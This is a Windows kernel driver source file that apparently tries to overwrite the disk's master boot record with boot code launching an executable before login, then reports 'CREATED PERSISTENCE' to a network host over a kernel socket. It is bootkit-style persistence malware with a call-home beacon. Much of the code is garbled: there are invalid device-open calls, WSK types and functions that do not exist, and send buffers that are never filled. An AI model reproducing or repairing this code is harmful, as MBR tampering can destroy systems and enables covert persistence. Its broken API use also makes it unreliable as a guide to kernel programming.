#include <ntddk.h>
#include <ntstrsafe.h>
#include <wsk.h>

#pragma warning(push)
#pragma warning(disable:4201) 
#pragma warning(disable:4214)
#include <windef.h>
#pragma warning(pop)

#define EXE_FILE_PATH L"\\SystemRoot\\example.exe"

#pragma pack(push, 1)
typedef struct _SOCKET_MESSAGE
{
    USHORT Length;
    USHORT Type;
    ULONG Flags;
    ULONG DataLength;
    ULONG OobDataLength;
} SOCKET_MESSAGE, *PSOCKET_MESSAGE;
#pragma pack(pop)

#define SOCKET_MESSAGE_TYPE_DATA 0

VOID
SendMessage(
    _In_ WSK_SOCKET Socket,
    _In_reads_(DataLength) PVOID Data,
    _In_ ULONG DataLength
    )
{
    SOCKET_MESSAGE message = { 0 };
    message.Length = (USHORT)sizeof(message);
    message.Type = SOCKET_MESSAGE_TYPE_DATA;
    message.DataLength = DataLength;

    WSK_BUF buffer = { 0 };
    buffer.Offset = 0;
    buffer.Length = sizeof(message);

    ULONG bytesSent = 0;
    NTSTATUS status = Socket->Dispatch->WskSend(
        Socket,
        &buffer,
        1,
        0,
        NULL,
        NULL,
        NULL,
        NULL
        );

    if (!NT_SUCCESS(status))
    {
        return;
    }

    buffer.Offset = 0;
    buffer.Length = DataLength;

    status = Socket->Dispatch->WskSend(
        Socket,
        &buffer,
        1,
        0,
        NULL,
        NULL,
        NULL,
        NULL
        );

    if (!NT_SUCCESS(status))
    {
        return;
    }
}

/* Your executable will be executed BEFORE the user even logs in. 
   Make sure your software navigates properly to correct directories. */

typedef struct _ORIGINAL_MBR
{
    CHAR BootCode[440];
    ULONG UniqueId;
    USHORT Unknown;
} ORIGINAL_MBR, *PORIGINAL_MBR;

ORIGINAL_MBR OriginalMbr;

NTSTATUS ReadMbr(PCHAR MbrBuffer)
{
    HANDLE DeviceHandle;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    LARGE_INTEGER ByteOffset;

    Status = IoGetDeviceObjectPointer(&UNICODE_NULL, FILE_READ_ATTRIBUTES, &DeviceHandle, &DeviceHandle);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    ByteOffset.QuadPart = 0;
    Status = ZwReadFile(DeviceHandle, NULL, NULL, NULL, &IoStatusBlock, MbrBuffer, 512, &ByteOffset, NULL);

    ZwClose(DeviceHandle);

    return Status;
}

NTSTATUS WriteMbr(PCHAR MbrBuffer)
{
    HANDLE DeviceHandle;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    LARGE_INTEGER ByteOffset;

    Status = IoGetDeviceObjectPointer(&UNICODE_NULL, FILE_WRITE_ATTRIBUTES, &DeviceHandle, &DeviceHandle);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    ByteOffset.QuadPart = 0;
    Status = ZwWriteFile(DeviceHandle, NULL, NULL, NULL, &IoStatusBlock, MbrBuffer, 512, &ByteOffset, NULL);

    ZwClose(DeviceHandle);

    return Status;
}

NTSTATUS CreateBootCode(PCHAR BootCode, ULONG BootCodeSize, PUNICODE_STRING ExeFilePath)
{
    ULONG i;
    ULONG PathLength;
    PCHAR PathBuffer;
    NTSTATUS Status;

    Status = RtlUnicodeStringToAnsiSize(ExeFilePath, &PathLength);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    if (PathLength > BootCodeSize - 2)
    {
        return STATUS_BUFFER_TOO_SMALL;
    }

    PathBuffer = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, PathLength, 'MBR');
    if (PathBuffer == NULL)
    {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    Status = RtlUnicodeStringToAnsiString(ExeFilePath, PathBuffer, PathLength);
    if (!NT_SUCCESS(Status))
    {
        ExFreePoolWithTag(PathBuffer, 'MBR');
        return Status;
    }

    RtlCopyMemory(BootCode,
                  "\xEB\x58\x90"
                  "NTLDR"
                  "\x00"
                  "\x0F\x01\x0D"
                  "\xE9\x00\x00\x00\x00"
                  "\xBB\x01\x00"
                  "\xB8\x01\x00\x00\x00"
                  "\x8E\xD8"
                  "\x8E\xC0"
                  "\x8E\xD0"
                  "\xBC\x00\x7C"
                  "\xFB\xA0\x05\x7C"
                  "\x89\xE6"
                  "\x83\xC6\x10"
                  "\xE2\xF3"
                  "\x89\xE1"
                  "\xFA"
                  "\xF2\xA4"
                  "\xE9\x00\x00\x00\x00",
                  44);

    RtlCopyMemory(BootCode + 44, PathBuffer, PathLength);
    BootCode[44 + PathLength] = '\0';
    ExFreePoolWithTag(PathBuffer, 'MBR');

    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    CHAR MbrBuffer[512];
    NTSTATUS Status;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    Status = ReadMbr(MbrBuffer);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    RtlCopyMemory(&OriginalMbr, MbrBuffer, sizeof(ORIGINAL_MBR));

    Status = CreateBootCode(MbrBuffer, sizeof(MbrBuffer), &EXE_FILE_PATH);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    Status = WriteMbr(MbrBuffer);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }
    
        WSK_CLIENT_DISPATCH dispatch = { 0 };
    dispatch.WskVersion = WSK_CLIENT_VERSION_1;
    dispatch.WskClientEvent = NULL;
    dispatch.WskProviderDispatch = NULL;

    WSK_REGISTRATION registration = { 0 };
    registration.ClientInfo.ClientContext = NULL;
    registration.ClientInfo.ClientEvent = NULL;
    registration.Dispatch = &dispatch;

    NTSTATUS status = WskRegister(&registration, &dispatch);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    WSK_PROVIDER_NPI providerNpi = { 0 };
    status = WskCaptureProviderNPI(&registration, WSK_INFINITE_WAIT, &providerNpi);
    if (!NT_SUCCESS(status))
    {
        WskDeregister(&registration);
        return status;
    }

    WSK_SOCKET_CONTEXT socketContext = { 0 };
    socketContext.Client = &registration;
    socketContext.Provider = &providerNpi;

    WSK_SOCKET_CONNECTION_DISPATCH connectionDispatch = { 0 };
    connectionDispatch.Size = sizeof(connectionDispatch);

    WSK_SOCKET_CONNECTION_DISPATCH* pConnectionDispatch = &connectionDispatch;
    ULONG connectionDispatchSize = sizeof(connectionDispatch);
    WSK_SOCKET_CONNECTION_DISPATCH_EX* pConnectionDispatchEx = NULL;

    WSK_SOCKET_CONNECTION_FAMILY family = { 0 };
    family.Family = AF_INET;
    family.SocketType = SOCK_STREAM;
    family.Protocol = IPPROTO_TCP;

    WSK_SOCKET_CONNECTION_FAMILY* pFamily = &family;
    ULONG familySize = sizeof(family);
    WSK_SOCKET_CONNECTION_FAMILY_EX* pFamilyEx = NULL;

    WSK_SOCKET_CONNECTION_PROVIDER_DISPATCH providerDispatch = { 0 };
    providerDispatch.Size = sizeof(providerDispatch);
    providerDispatch.WskSocketConnect = providerNpi.Dispatch->WskSocketConnect;
    providerDispatch.WskSocketConnectEx = providerNpi.Dispatch->WskSocketConnectEx;
    providerDispatch.WskSocketDisconnect = providerNpi.Dispatch->WskSocketDisconnect;

    WSK_SOCKET_CONNECTION_PROVIDER_DISPATCH* pProviderDispatch = &providerDispatch;
    ULONG providerDispatchSize = sizeof(providerDispatch);
    WSK_SOCKET_CONNECTION_PROVIDER_DISPATCH_EX* pProviderDispatchEx = NULL;
    WSK_SOCKET_CONNECTION_PROPERTIES properties = { 0 };
    properties.LocalAddress = NULL;
    properties.LocalAddressLength = 0;
    properties.RemoteAddress = NULL;
    properties.RemoteAddressLength = 0;
    properties.SecurityContext = NULL;
    properties.SecurityQos = NULL;
    properties.SecurityQosLength = 0;
    properties.Flags = 0;
    properties.ClientContext = NULL;

    WSK_SOCKET_CONNECTION_PROPERTIES* pProperties = &properties;
    ULONG propertiesSize = sizeof(properties);
    WSK_SOCKET_CONNECTION_PROPERTIES_EX* pPropertiesEx = NULL;

    WSK_SOCKET socket = NULL;
    status = providerNpi.Dispatch->WskSocketConnect(
        &socketContext,
        pConnectionDispatch,
        connectionDispatchSize,
        pConnectionDispatchEx,
        pFamily,
        familySize,
        pFamilyEx,
        pProviderDispatch,
        providerDispatchSize,
        pProviderDispatchEx,
        pProperties,
        propertiesSize,
        pPropertiesEx,
        NULL,
        WSK_INFINITE_WAIT,
        &socket
        );

    if (!NT_SUCCESS(status))
    {
        WskReleaseProviderNPI(&registration);
        WskDeregister(&registration);
        return status;
    }

    SOCKADDR_IN addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.1");
    addr.sin_port = htons(9000);

    status = socket->Dispatch->WskControlSocket(
        socket,
        WSK_CONTROL_SOCKET_SET_REMOTE_ADDRESS,
        WSK_SIZE_OF_CONTROL_SOCKET_SET_REMOTE_ADDRESS,
        &addr,
        sizeof(addr),
        NULL,
        0,
        NULL
        );

    if (!NT_SUCCESS(status))
    {
        socket->Dispatch->WskCloseSocket(socket, WSK_INFINITE_WAIT, NULL);
        WskReleaseProviderNPI(&registration);
        WskDeregister(&registration);
        return status;
    }
    
    const char* data = "CREATED PERSISTENCE";
    ULONG dataLength = (ULONG)strlen(data);

    SendMessage(socket, (PVOID)data, dataLength);

    socket->Dispatch->WskCloseSocket(socket, WSK_INFINITE_WAIT, NULL);
    WskReleaseProviderNPI(&registration);
    WskDeregister(&registration);

    return STATUS_SUCCESS;
}
